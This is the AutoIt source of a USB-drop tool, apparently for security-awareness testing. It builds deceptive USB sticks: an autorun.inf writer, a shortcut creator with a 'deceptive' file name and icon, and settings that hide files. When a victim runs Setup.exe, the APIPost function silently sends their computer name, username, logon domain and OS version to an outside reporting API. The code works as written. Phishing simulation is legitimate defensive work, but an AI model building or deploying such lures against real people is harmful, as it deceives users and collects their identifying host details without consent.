#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=icons/puzzle.ico
#AutoIt3Wrapper_Outfile=Setup.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=Y
#AutoIt3Wrapper_Run_Tidy=y
#AutoIt3Wrapper_Run_Au3Stripper=y
#Au3Stripper_Parameters=/sf /sv /rm
#AutoIt3Wrapper_Run_Before=precompile.cmd
#AutoIt3Wrapper_Run_After=postcompile.cmd
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#cs ===========================================================================================================================

	AutoIt Version: 3.3.14.2
	Author:         USBDrop.com

	Script Function:
	Send a request to the USB Drop API to signal the application has been run
	===============================================================================
	Copyright 2017 USBDrop.com

	Permission is hereby granted, free of charge, to any person obtaining a copy of
	this software and associated documentation files (the "Software"), to deal in
	the Software without restriction, including without limitation the rights to
	use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
	of the Software, and to permit persons to whom the Software is furnished to do
	so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.
	================================================================================
#ce ===========================================================================================================================
#pragma compile(ProductName, 'USBDrop.com Reporting Module')
#pragma compile(LegalCopyright, '© USBDrop.com')
#pragma compile(CompanyName, 'http://USBDrop.com')
#pragma compile(Icon, 'icons/puzzle.ico')
#pragma compile(Out, 'Setup.exe')

#include <Inet.au3>
#include <GUIConstantsEx.au3>
#include <EditConstants.au3>
#include <WindowsConstants.au3>
#include <StaticConstants.au3>

AutoItSetOption('MustDeclareVars', 1)

Global $sAPIKey
Global $sStickID
Global $bDebuggingEnabled = False
Global $bConfigMode = False
Global $sLicenseText

$sLicenseText = 'Copyright 2017 USBDrop.com ' & @CRLF & @CRLF
$sLicenseText &= 'Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:' & @CRLF & @CRLF
$sLicenseText &= 'The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.' & @CRLF & @CRLF
$sLicenseText &= 'THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.'


Main()
Exit 0

; #FUNCTION# ====================================================================================================================
; Name ...........: Main
; Description ....: Main Program
; ===============================================================================================================================
Func Main()
	CheckAndEnableDebug()
	CheckCommandLineParameters()
	If (FileExists(@ScriptDir & '\autorun.inf') = 0) Then $bConfigMode = True
	If $bConfigMode = True Then ShowConfigurationGUI()
	If $bConfigMode = False Then APIPost()
EndFunc   ;==>Main
; #FUNCTION# ====================================================================================================================
; Name ...........:  ()
; Description ....: Enable debugging if configured in the INIFile
; ===============================================================================================================================
Func ShowConfigurationGUI()
	; Create a GUI
	If (FileExists(@ScriptDir & "\autorun.inf")) Then
		$sAPIKey = ReadValueFromINIConfig('A')
		If (StringLen($sAPIKey) <> 64) Then $sAPIKey = ''
		$sStickID = ReadValueFromINIConfig('I')
		If (StringLen($sStickID) <> 64) Then $sStickID = ''
	EndIf

	Local $hGUI = GUICreate("USBDrop.com Reporting Module Configuration", 600, 200)
	GUICtrlCreateTab(10, 10, 580, 180)
	GUICtrlCreateTabItem("API Settings")
	GUICtrlCreateLabel("API Key", 20, 50, 50, 20)
	Local $hAPIKeyInput = GUICtrlCreateInput($sAPIKey, 70, 50, 510, 20)
	GUICtrlSetFont($hAPIKeyInput, 9, 400, 0, 'Courier New')

	GUICtrlCreateLabel("Stick ID", 20, 80, 50, 20)
	Local $hStickIDInput = GUICtrlCreateInput($sStickID, 70, 80, 510, 20)
	GUICtrlSetFont($hStickIDInput, 9, 400, 0, 'Courier New')

	GUICtrlCreateLabel("Deceptive Drive Label", 20, 110, 120, 20)
	Local $hLabelInput = GUICtrlCreateInput('', 140, 110, 440, 20)

	Local $hSignupButton = GUICtrlCreateButton("Sign up at http://usbdrop.com", 20, 150, 220, 20)

	Local $hAPISettingsSaveButton = GUICtrlCreateButton("Save autorun.inf", 360, 150, 220, 20)
	GUICtrlCreateTabItem("*.lnk Creator")
	GUICtrlCreateLabel("Deceptive File Name", 20, 50, 110, 20)
	Local $hLNKFilename = GUICtrlCreateInput("", 130, 50, 400, 20)
	GUICtrlCreateLabel("Deceptive Icon File", 20, 80, 110, 20)
	Local $hLNKIconPath = GUICtrlCreateInput("", 130, 80, 380, 20)
	Local $hLNKIconPrevew = GUICtrlCreateIcon('', -1, 520, 80, 20, 20)
	Local $hLNKIconBrowse = GUICtrlCreateButton('...', 550, 80, 30, 20)
	Local $hLNKSaveButton = GUICtrlCreateButton("Create *.lnk file", 20, 160, 560, 20)
	GUICtrlCreateTabItem('File Attributes')
	GUICtrlCreateLabel('autorun.inf', 20, 50, 60, 20)
	Local $hAutoruninfButton = GUICtrlCreateButton('x', 80, 50, 90, 20)
	ToggleFileButtonStatus($hAutoruninfButton, 'autorun.inf', False)
	GUICtrlCreateLabel('Setup.exe', 20, 70, 60, 20)
	Local $hSetupexeButton = GUICtrlCreateButton('x', 80, 70, 90, 20)
	ToggleFileButtonStatus($hSetupexeButton, 'setup.exe', False)
	GUICtrlCreateLabel('readme.md', 220, 50, 60, 20)
	Local $hReadmemdButton = GUICtrlCreateButton('x', 280, 50, 90, 20)
	ToggleFileButtonStatus($hReadmemdButton, 'readme.md', True)
	GUICtrlCreateLabel('License.txt', 220, 70, 60, 20)
	Local $hLicensetxtButton = GUICtrlCreateButton('x', 280, 70, 90, 20)
	ToggleFileButtonStatus($hLicensetxtButton, 'license.txt', True)
	GUICtrlCreateLabel('Icons/', 420, 50, 60, 20)
	Local $hIconsButton = GUICtrlCreateButton('x', 480, 50, 90, 20)
	ToggleFileButtonStatus($hIconsButton, 'icons', True)

	GUICtrlCreateTabItem("License")
	Local $hLicenseEdit = GUICtrlCreateEdit($sLicenseText, 20, 40, 560, 140, $ES_READONLY + $ES_AUTOVSCROLL + $WS_VSCROLL)

	GUICtrlCreateTabItem("")

	; Display the GUI.
	GUISetState(@SW_SHOW, $hGUI)

	While 1
		Switch GUIGetMsg()
			Case $GUI_EVENT_CLOSE
				ExitLoop
			Case $hSignupButton
				ShellExecute('http://usbdrop.com')
			Case $hAPISettingsSaveButton
				$sAPIKey = GUICtrlRead($hAPIKeyInput)
				$sStickID = GUICtrlRead($hStickIDInput)
				WriteINIFile(GUICtrlRead($hLabelInput))
			Case $hLNKIconBrowse
				Local $sNewIcon = FileOpenDialog('Icon File', @ScriptDir & '\icons\', 'Icon Files (*.ico)')
				GUICtrlSetData($hLNKIconPath, $sNewIcon)
				GUICtrlSetImage($hLNKIconPrevew, $sNewIcon)
			Case $hLNKSaveButton
				LnkSave(GUICtrlRead($hLNKFilename), GUICtrlRead($hLNKIconPath))
			Case $hReadmemdButton
				HideFile('readme.md')
				ToggleFileButtonStatus($hReadmemdButton, 'readme.md', True)
			Case $hLicensetxtButton
				HideFile('license.txt')
				ToggleFileButtonStatus($hReadmemdButton, 'license.txt', True)
			Case $hIconsButton
				HideFile('icons/')
				ToggleFileButtonStatus($hIconsButton, 'icons', True)
		EndSwitch
	WEnd

	; Delete the previous GUIs and all controls.
	GUIDelete($hGUI)

EndFunc   ;==>ShowConfigurationGUI
; #FUNCTION# ====================================================================================================================
; Name ...........: CheckCommandLineParameters ()
; Description ....: Enable debugging if configured in the INIFile
; ===============================================================================================================================
Func CheckCommandLineParameters()
	Local $sParameter
	If ($CmdLine[0] = 0) Then Return
	For $sParameter In $CmdLine
		$sParameter = StringLower($sParameter)
		If ($sParameter = 'config') Then $bConfigMode = True
		If ($sParameter = 'debug') Then $bDebuggingEnabled = True
	Next
EndFunc   ;==>CheckCommandLineParameters
; #FUNCTION# ====================================================================================================================
; Name ...........: CheckAndEnableDebug ()
; Description ....: Enable debugging if configured in the INIFile
; ===============================================================================================================================
Func CheckAndEnableDebug()
	If ReadValueFromINIConfig('D') = 1 Then
		$bDebuggingEnabled = True
	EndIf
EndFunc   ;==>CheckAndEnableDebug
; #FUNCTION# ====================================================================================================================
; Name ...........: APIPost
; Description ....: Performs unauthenticated HTTP Post request
; ===============================================================================================================================
Func APIPost()
	$sAPIKey = ReadValueFromINIConfig('A')
	If (StringLen($sAPIKey) <> 64) Then Exit (10)
	$sStickID = ReadValueFromINIConfig('I')
	If (StringLen($sStickID) <> 64) Then Exit (20)

	Local $sPostData = 's=' & $sStickID
	$sPostData &= '&c=' & @ComputerName
	$sPostData &= '&u=' & @UserName
	$sPostData &= '&d=' & @LogonDomain
	$sPostData &= '&o=' & @OSVersion
	$sPostData &= '&ld=' & @MON & '/' & @MDAY & '/' & @YEAR
	$sPostData &= '&lt=' & @HOUR & ':' & @MIN & ':' & @SEC
	Local $sPostBase = 'https://usbdrop.com/api/v1/'

	If ($bDebuggingEnabled) Then ConsoleWrite('Base URL: (' & $sPostBase & ')' & @CRLF)
	If ($bDebuggingEnabled) Then ConsoleWrite('Post Data: (' & $sPostData & ')' & @CRLF)

	; Creating the object
	Local $oHTTP = ObjCreate("winhttp.winhttprequest.5.1")
	$oHTTP.Open("POST", $sPostBase, False)
	$oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
	$oHTTP.SetRequestHeader("User-Agent", 'USBDrop Reporting Module 1.0')
	$oHTTP.SetRequestHeader("APIKey", $sAPIKey)

	; Performing the Request
	$oHTTP.Send($sPostData)

	; Download the body response if any, and get the server status response code.
	Local $sReceived = $oHTTP.ResponseText
	Local $iStatusCode = $oHTTP.Status

	If ($bDebuggingEnabled) Then ConsoleWrite('HTTP Recieved: (' & $sReceived & ')' & @CRLF)
	If ($bDebuggingEnabled) Then ConsoleWrite('HTTP Status: (' & $iStatusCode & ')' & @CRLF)

	If ($iStatusCode <> 200) Then Exit $iStatusCode

EndFunc   ;==>APIPost
; #FUNCTION# ====================================================================================================================
; Name ...........: ReadValueFromINIConfig($sVariableName)
; Description ....: Read a configuration variable from the INI File (autorun.inf)
; ===============================================================================================================================
Func ReadValueFromINIConfig($sVariableName)
	Local $Result
	If ($bDebuggingEnabled) Then ConsoleWrite('ReadValueFromINIConfig reading from INI file: ' & '\autorun.inf' & @CRLF)
	$Result = IniRead(@ScriptDir & '\autorun.inf', 'Config', $sVariableName, Default)
	If ($bDebuggingEnabled) Then ConsoleWrite('ReadValueFromINIConfig(' & $sVariableName & ') Returned: ' & $Result & @CRLF)
	Return ($Result)
EndFunc   ;==>ReadValueFromINIConfig
; #FUNCTION# ====================================================================================================================
; Name ...........: IsFileHidden ($sFilename)
; Description ....: Determine if a file/path is hidden
; ===============================================================================================================================
Func IsFileHidden($sFilename)
	Local $sFileAttribs = FileGetAttrib($sFilename)
	If ($bDebuggingEnabled) Then ConsoleWrite('FileGetAttrib(' & $sFilename & ') Returned: ' & $sFileAttribs & @CRLF)
	If (StringInStr($sFileAttribs, 'H') > 0) Then
		Return True
	Else
		Return False
	EndIf
EndFunc   ;==>IsFileHidden
; #FUNCTION# ====================================================================================================================
; Name ...........: ToggleFileButtonStatus ($hButton, $sFilename, $bShouldBeHidden)
; Description ....: Change the txt of a button to read hidden or not hidden
; ===============================================================================================================================
Func ToggleFileButtonStatus($hButton, $sFilename, $bShouldBeHidden = True)
	If (IsFileHidden($sFilename)) Then
		GUICtrlSetData($hButton, 'Hidden')
		If ($bShouldBeHidden = True) Then
			GUICtrlSetBkColor($hButton, 0x00FF00)
		Else
			GUICtrlSetBkColor($hButton, 0xFF0000)
		EndIf
	Else
		GUICtrlSetData($hButton, 'Not Hidden')
		If ($bShouldBeHidden = True) Then
			GUICtrlSetBkColor($hButton, 0xFF0000)
		Else
			GUICtrlSetBkColor($hButton, 0x00FF00)
		EndIf
	EndIf
EndFunc   ;==>ToggleFileButtonStatus
; #FUNCTION# ====================================================================================================================
; Name ...........: HideFile ($hButton, $sFilename)
; Description ....: Set the Hidden Attribute on a file
; ===============================================================================================================================
Func HideFile($sFilename)
	Return FileSetAttrib($sFilename, '+H')
EndFunc   ;==>HideFile
; #FUNCTION# ====================================================================================================================
; Name ...........: LnkSave($sLNKFilename,$sLNKIcon)
; Description ....: Change the txt of a button to read hidden or not hidden
; ===============================================================================================================================
Func LnkSave($sLNKFilename, $sLNKIcon)
	;Local $sLNKIcon =
	$sLNKFilename = @ScriptDir & '\' & $sLNKFilename & '.lnk'
	Local $Result = FileCreateShortcut(@AutoItExe, $sLNKFilename, Default, '', Default, $sLNKIcon)
	If ($Result = 1) Then
		MsgBox(0, "Create Shortcut", "*.lnk Created")
	Else
		MsgBox(0, "Create Shortcut", "Unable to create *.lnk" & @CRLF & $sLNKFilename)
	EndIf
EndFunc   ;==>LnkSave
; #FUNCTION# ====================================================================================================================
; Name ...........: WriteINIFile ($sLabel)
; Description ....: Create the autorun.inf file
; ===============================================================================================================================
Func WriteINIFile($sLabel)
	Local $sFilename = 'autorun.inf'
	Local $sSection

	$sSection = 'autorun'
	IniWrite($sFilename, $sSection, 'open', 'setup.exe')
	IniWrite($sFilename, $sSection, 'icon', 'icons/puzzle.ico')
	IniWrite($sFilename, $sSection, 'label', $sLabel)

	$sSection = 'Content'
	IniWrite($sFilename, $sSection, 'MusicFiles', 0)
	IniWrite($sFilename, $sSection, 'PictureFiles', 0)
	IniWrite($sFilename, $sSection, 'VideoFiles', 0)

	$sSection = 'Config'
	IniWrite($sFilename, $sSection, 'A', $sAPIKey)
	IniWrite($sFilename, $sSection, 'I', $sStickID)
EndFunc   ;==>WriteINIFile
